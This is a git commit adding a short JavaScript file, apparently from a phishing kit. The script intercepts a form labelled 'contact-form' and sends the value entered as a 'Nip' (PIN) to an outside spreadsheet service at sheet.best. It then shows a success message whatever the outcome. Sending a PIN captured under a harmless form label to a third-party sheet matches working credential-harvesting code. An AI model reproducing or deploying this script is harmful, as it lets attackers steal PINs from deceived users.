71965c068d03201824e4da026374630258f0a9bf
SoporteH2 <huaweiy62018118@gmail.com>
2024-07-19 19:17:58 -0600

    Add files via upload

---
+++ js/app3.js
@@ -0,0 +1,29 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/99f17f70-8bc4-4c5c-998f-b6ac178e4983', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Nip": formulario.usuario.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
